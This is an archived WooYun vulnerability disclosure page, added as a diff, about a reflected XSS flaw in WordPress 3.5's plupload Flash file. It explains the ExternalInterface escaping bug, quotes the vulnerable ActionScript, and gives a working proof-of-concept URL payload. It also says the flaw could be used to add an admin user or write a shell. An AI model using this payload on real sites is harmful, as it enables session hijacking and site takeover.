@@ -1,0 +1,209 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Flash应用安全系列[3]--WordPress反射型跨站(0day)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Flash应用安全系列[3]--WordPress反射型跨站(0day)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/p.z">p.z</a> 
+</li><li>提交时间：		2013-01-11 11:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-11：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-02-25：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">WordPress3.5某处Flash应用存在漏洞，可能导致跨站脚本攻击。<br />
+当一个已经登录后台的会话访问某一特定网页时，攻击者精心构造的payload可以在后台添加一个同等权限的用户，并写入Shell（如果权限允许的话）。<br />
+http://player.youku.com/player.php/sid/XNTAwMjY0MzQ4/v.swf</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这种类型的漏洞是Google的大牛Michal Zalewski最先公开的，我这里就简单说明下。(原文 The other reason to beware ExternalInterface.call() -- http://lcamtuf.blogspot.com/2011/03/other-reason-to-beware-of.html)<br />
+<br />
+<br />
+<br />
+as脚本运行flash.external.ExternalInterface.call($methodName, $parameter)时，flash player会调用HTML的js，运行<br />
+<br />
+</p><pre><code>try { __flash__toXML($methodName(&quot;$parameter&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+如果我们试着尝试在$parameter中加入&quot; 如flash.external.ExternalInterface.call(&quot;alert&quot;,&#039;&quot;2&#039;)，js运行的是<br />
+<br />
+</p><pre><code>try { __flash__toXML(alert(&quot;\&quot;2&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+flash player会对&quot;进行转义，但搞笑的是对于传入的\，flash player却原样输出了，如此一来，我们就可以利用传入的\去转义原本用来转义&quot;的转义符\。<br />
+<br />
+flash.external.ExternalInterface.call(&quot;alert&quot;,&#039;\\&quot;2&#039;)<br />
+<br />
+</p><pre><code>try { __flash__toXML(alert(&quot;\\&quot;2&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+剩下的就是闭合)}这类的事情了<br />
+<br />
+</p><pre><code>flash.external.ExternalInterface.call(&quot;alert&quot;,&#039;\\&quot;2))}catch(e){alert(3)//&#039;)<br />
+try { __flash__toXML(alert(&quot;\\&quot;2))}catch(e){alert(3)//}&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+Vulnerable SWF File: /wp-includes/js/plupload/plupload.flash.swf<br />
+<br />
+Vulnerable Code:<br />
+<br />
+com.plupload.Plupload<br />
+<br />
+</p><pre><code>private function init(event:Event = null) : void<br />
+{<br />
+	removeEventListener(Event.ADDED_TO_STAGE, this.init);<br />
+	this.id = this.stage.loaderInfo.parameters[&quot;id&quot;];<br />
+	...<br />
+	this.fireEvent(&quot;Init&quot;);<br />
+	return;<br />
+}// end function<br />
+...<br />
+private function fireEvent(param1:String, param2:Object = null) : void<br />
+{<br />
+	ExternalInterface.call(&quot;plupload.flash.trigger&quot;, this.id, param1, param2);<br />
+	return;<br />
+}// end function</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+原始SWF下载：http://swfpoc.appspot.com/vul/wordpress_plupload.flash.swf<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">Proof of Concept:<br />
+<br />
+http://wordpress/wp-includes/js/plupload/plupload.flash.swf?id=0\&quot;))}catch(e){if(!window.x){window.x=1;alert(2)}}//<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/p.z" title="p.z">p.z</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017189" title="Flash应用安全系列[3]--WordPress反射型跨站(0day)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17189";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
